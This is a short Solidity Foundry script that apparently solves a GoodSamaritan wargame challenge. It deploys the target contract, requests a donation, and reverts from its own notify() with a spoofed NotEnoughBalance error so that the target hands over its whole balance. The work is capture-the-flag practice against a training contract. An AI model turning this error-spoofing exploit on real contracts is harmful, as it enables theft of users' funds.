// SPDX-License-Identifier: MIT
pragma solidity >=0.8.10;

import "forge-std/Script.sol";
import "../src/GoodSamaritan.sol";

contract GoodSamaritanHack is Script {
    GoodSamaritan public victim;

    error NotEnoughBalance();

    function setUp() public {
        victim = new GoodSamaritan();
    }

    function run() public {
        victim.requestDonation();
    }

    function notify(uint256 _amount) external pure {
        if (_amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
